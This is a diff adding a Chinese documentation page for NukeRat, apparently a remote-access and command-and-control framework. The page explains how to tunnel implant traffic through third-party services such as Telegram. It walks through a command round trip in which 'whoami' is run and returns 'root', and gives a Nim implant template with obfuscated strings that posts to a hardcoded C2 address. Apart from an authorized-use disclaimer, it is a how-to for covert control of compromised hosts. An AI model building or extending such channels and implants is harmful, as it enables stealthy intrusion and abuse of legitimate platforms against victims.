@@ -1,0 +1,145 @@
+---
+title: 自定义通道
+---
+
+import { Callout } from '@/ui/custom/callout';
+import customChannelMap from '@/assets/img/tutorial/map.png';
+import { ImageZoom } from 'fumadocs-ui/components/image-zoom';
+import { Step, Steps } from 'fumadocs-ui/components/steps';
+
+若希望通过 Telegram、Discord 等外部服务建立通信通道，可参考本文。
+
+<Callout
+  type="warning"
+  title="第三方平台"
+  className="rounded-[6px] border-red-500/70 bg-red-950/50 shadow-red-950/20 [&_svg]:text-red-400 [&_.text-fd-muted-foreground]:text-red-100/95 [&_p.font-medium]:text-red-200"
+>
+  NukeRat 项目不影响、不推荐、也不推动在未获操作方明确授权且未完全遵守适用法律的前提下，将第三方平台用作命令与控制。上文所列名称仅为示例，不代表项目背书或操作指引。
+</Callout>
+
+## 工作原理
+
+构建自定义通道前，先理清各组件如何配合。整体可概括为三个支柱：
+
+1. HTTP 监听器
+2. 带自定义通道的植入体
+3. 自定义脚本
+
+三者配合，在植入体除所选、已获授权的第三方服务外不发起其他请求的前提下，完成植入体与团队服务端之间的通信。
+
+整体流程可参考下图：
+
+<ImageZoom src={customChannelMap} alt="自定义通道流程" className="tutorial_img" />
+
+### ( 2 ) 监听器
+
+需要已配置的 HTTP 监听器。也可改用团队服务端 API，为便于理解，下文示例均使用 HTTP 监听器。
+
+### ( 3 ) 自定义脚本
+
+这是关键步骤之一。你需要编写脚本，在所选第三方服务与监听器之间「翻译」流量。
+
+### ( 4 ) 第三方平台
+
+即你选作外部通信通道的平台。
+
+### ( 5 ) 植入体
+
+在编译阶段已嵌入针对该服务的自定义通信逻辑的植入体。
+
+## 通信流程
+
+了解结构后，以类似 Telegram 的外部消息平台为例说明一次完整往返：
+
+  <Steps>
+    <Step>
+      向队列发送 `whoami` 命令。
+    </Step>
+    <Step>
+      自定义脚本循环运行，每 5 秒向监听器拉取命令。发现命令后，向外部服务发送请求，例如：
+
+      ```
+      input | 938192 | whoami
+      ```
+    </Step>
+    <Step>
+      外部服务上出现内容相同的消息。
+    </Step>
+    <Step>
+      植入体自行向该外部服务发起请求，携带认证所需的 API 密钥与令牌。每次请求检查是否有待执行命令；发现后执行。
+
+      随后将结果发回外部服务，例如：
+
+      ```
+      output | 938192 | whoami | root
+      ```
+    </Step>
+    <Step>
+      自定义脚本在某次循环中读到该输出，按 [植入体 API](/docs/rest-api/implants) 的通信格式向监听器发起请求，如同植入体本身；之后从外部服务删除该内容。
+    </Step>
+    <Step>
+      监听器收到请求，按植入体流量处理并完成命令回传。
+    </Step>
+  </Steps>
+
+## 自定义脚本
+
+本质并不复杂：你需要负责一段循环脚本，监视所选外部服务并将流量转发至监听器。目标越复杂，此处工作量越大，尤其是拆分超大输入或输出时。
+
+## 自定义通道
+
+如前所述，植入体须在编译时内置针对所选服务的通信逻辑，往往需要自行编写，有时需从零开始。
+
+在创建植入体时，打开 **Command and control**，在 CHANNEL 下选择 **Custom channel**。
+
+随后会出现带代码模板的文本区域，大致如下：
+
+```nim
+
+# imports...
+
+var customServerHost = obf("http://192.168.15.10:9090/")
+const delaySeconds = 2
+customCookies = toTable([
+  (obf("session"), obf("example")),
+  (obf("token"), obf("example")),
+])
+customHeaders = toTable([
+  (obf("User-Agent"), obf("Mozilla/5.0")),
+  (obf("X-Custom-Header"), obf("example")),
+])
+
+proc httpPost(
+    url, payload: string;
+    cookies: Table[string, string];
+    headers: Table[string, string]
+): tuple[code: uint16, body: string] =
+  var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
+  for key, value in headers:
+    pairs.add((key, value))
+  var cookieParts: seq[string] = @[]
+  for key, value in cookies:
+    cookieParts.add(key & obf("=") & value)
+  if cookieParts.len > 0:
+    pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
+  let r = nhttp.winHttpPerform(url, "POST", payload, pairs)
+  (code: r.code, body: r.body)
+
+# Rest of the code...
+```
+
+这实质上是默认 HTTP 通信的过程式写法，便于按需改造。可根据需求修改逻辑。
+
+更复杂场景下，可额外加入分片、加密等辅助逻辑。
+
+## 中继与跳板
+
+这部分调参较繁琐但不可或缺。**Implant routine** 标签旁有 **Relay forwarder**，即出站中继所用逻辑。
+
+配置中继时，最后一跳中继必须把流量封装为 HTTP 请求与 JSON；由该代码块负责。若要在自定义通道上同时使用中继，此处也需一并调整。
+
+好在多数情况下，可将 **Implant routine** 中的逻辑适配到 **Relay forwarder**。
+
+## 反复测试
+
+自定义通道的搭建可能繁琐且复杂，建议在实战依赖前完整跑通逻辑。每次构建植入体时，逻辑错误会以异常形式暴露，便于迭代开发。
